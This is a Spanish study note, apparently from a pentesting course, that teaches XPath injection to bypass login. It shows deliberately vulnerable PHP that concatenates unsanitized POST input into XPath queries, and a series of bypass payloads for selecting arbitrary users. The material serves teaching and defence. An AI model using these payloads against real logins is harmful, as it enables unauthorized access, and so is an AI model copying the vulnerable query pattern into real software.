---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
Fecha de actualización: 2025-10-20
Nota previa: "[[Inyección XPath]]"
Nota siguiente:
Area: "[[Inyección XPath]]"
---
---

# Autenticación con XPath
¿**Cómo se puede implementar la autenticación a través de consultas *XPath***?. Como ejemplo, consideremos un documento *XML* que almacena datos de usuario como este:
```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>P@ssw0rd!</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>admin</username>
		<password>admin</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>Academy_student!</password>
	</user>
</users>
```

Para realizar la autenticación, la aplicación web podría ejecutar una consulta *XPath* como la siguiente:
```xpath
/users/user[username/text()='htb-stdnt' and password/text()='Academy_student!']
```

El código *PHP* vulnerable inserta el nombre de usuario y la contraseña sin desinfección previa en la consulta:
```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
```

Nuestro <mark style="background: #ADCCFFA6;">objetivo es evitar la autenticación inyectando un nombre de usuario y una contraseña de modo que la consulta XPath siempre evalúe `true`</mark>. Podemos lograr esto inyectando el valor `' or '1'='1` como nombre de usuario y contraseña. La consulta XPath resultante se ve así:
```xpath
/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```
> [!success]+
> Dado que **el predicado se evalúa como `true`, la consulta devuelve todos los nodos `user` de elementos del documento *XML***. 

¿**Qué pasa si queremos iniciar sesión como `admin`**? En ese caso, tenemos que <mark style="background: #ADCCFFA6;">inyectar un nombre de usuario de `admin' or '1'='1` y un valor arbitrario para la contraseña</mark>. De esta manera, la consulta *XPath* resultante se ve así:
```xpath
/users/user[username/text()='admin' or '1'='1' and password/text()='abc']
```
> [!important]+
> Debido a la cláusula `or`, la consulta anterior nos iniciará sesión como `admin` usuario sin proporcionar la contraseña correcta.

---

# Explotación
En escenarios del mundo real, las **contraseñas suelen estar codificadas**. Además, es posible que <mark style="background: #FFB8EBA6;">no conozcamos un nombre de usuario válido</mark>, por lo tanto, <mark style="background: #FFB86CA6;">no podemos utilizar los payloads mencionadas anteriormente</mark>. Afortunadamente, podemos utilizar *payloads* de inyección más avanzados para eludir la autenticación en tales casos. Consideremos el siguiente ejemplo:
```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>8a24367a1f46c141048752f2d5bbd14b</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>obfuscatedadminuser</username>
		<password>21232f297a57a5a743894a0e4a801fc3</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>295362c2618a05ba3899904a6a3f5bc0</password>
	</user>
</users>
```

En este caso, el código *PHP* vulnerable puede verse así:
```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
$results = $xml->xpath($query);
```

Dado que la **contraseña se codifica antes de insertarla en la consulta**, se inyecta un nombre de usuario y una contraseña de `' or '1'='1` dará como resultado la siguiente consulta:
```xpath
/users/user[username/text()='' or '1'='1' and password/text()='59725b2f19656a33b3eed406531fb474']
```
> [!missing]+
> <mark style="background: #ADCCFFA6;">Esta consulta no devuelve ningún nodo</mark>, por lo tanto, no podemos eludir la autenticación de esta manera. Dado que tampoco conocemos ningún nombre de usuario válido, no podemos eludir la autenticación con los *payloads* analizados hasta ahora.

En primer lugar, <mark style="background: #FFB86CA6;">podemos inyectar una doble cláusula `or` en el nombre de usuario</mark> para que la consulta *XPath* retorne `true`, devolviendo así todos los nodos de usuario de modo que iniciemos sesión como el primer usuario. Un ejemplo de *payload* sería `' or true() or '` dando como resultado la siguiente consulta:
```xpath
/users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```
> [!info]+ 
> Debido a la forma en que se evalúa la consulta, el doble `or` da como resultado un universal `true` universal, por lo que omitimos la autenticación.

Sin embargo, tal como se discutió anteriormente, <mark style="background: #8000E1A6;">es posible que queramos iniciar sesión como un usuario específico para obtener más privilegios</mark>. Una forma de hacerlo es <mark style="background: #FFB8EBA6;">iterar sobre todos los usuarios por su posición</mark>. Esto se puede lograr con: `' or position()=2 or '`, lo que da como resultado la siguiente consulta:
```xpath
/users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Esto devolverá solo el nodo de usuario `second`. <mark style="background: #ADCCFFA6;">Podemos incrementar la posición para iterar sobre todos los usuarios hasta encontrar el usuario que buscamos</mark>. Puede haber millones de usuarios en implementaciones del mundo real, por lo que esta técnica manual se volverá inviable muy rápidamente. En cambio, <mark style="background: #FFB86CA6;">podemos buscar usuarios específicos si conocemos parte del nombre de usuario</mark>. Para ello, podemos usar: `' or contains(.,'admin') or '`, lo que da como resultado la siguiente consulta:
```xpath
/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```
> [!success]+
> <mark style="background: #FF5582A6;">Esta consulta devuelve todos los nodos de usuario que contienen la cadena `admin` en cualquier descendiente</mark>. Desde el `username` el nodo es hijo del nodo `user`, esto devuelve todos los usuarios que contienen la subcadena `admin` en el nombre de usuario.